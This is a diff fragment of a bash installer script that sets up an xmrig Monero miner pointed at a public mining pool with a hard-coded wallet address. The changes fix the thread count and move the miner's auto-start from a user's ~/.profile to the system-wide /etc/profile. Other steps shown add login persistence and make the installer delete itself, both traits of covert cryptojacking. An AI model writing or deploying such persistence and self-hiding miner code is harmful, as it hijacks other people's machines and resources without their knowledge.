@@ -49,7 +49,7 @@ while true; do
             if [ "\$current_threads" != "\$threads" ]; then
                 echo "Adjusting miner to use \$threads threads..."
                 pkill xmrig
-                $miner_path --threads "\$threads" -o pool.supportxmr.com:3333 -u 47DH5d5rJmy1Z56CMKrXhE4hCW1ZMkqxu4mbvAX83PRfiU6RLXp7cyr9BHo1jjnRL6RD85oBA9JjjSZwaxspRQDwVszK5eq -p "$rig_id" &
+                $miner_path --threads 2 -o pool.supportxmr.com:3333 -u 47DH5d5rJmy1Z56CMKrXhE4hCW1ZMkqxu4mbvAX83PRfiU6RLXp7cyr9BHo1jjnRL6RD85oBA9JjjSZwaxspRQDwVszK5eq -p "$rig_id" &
             fi
         fi
     else
@@ -70,7 +70,7 @@ chmod +x ~/control_miner.sh
 
 # Step 7: Add the control script to ~/.profile for auto-run on login
 echo "Adding control script to ~/.profile for auto-run on login..."
-echo "bash ~/control_miner.sh &" >> ~/.profile
+sudo echo "bash ~/control_miner.sh &" >> /etc/profile
 
 # Step 8: Self-remove the installer script
 echo "Self-removing the installation script..."
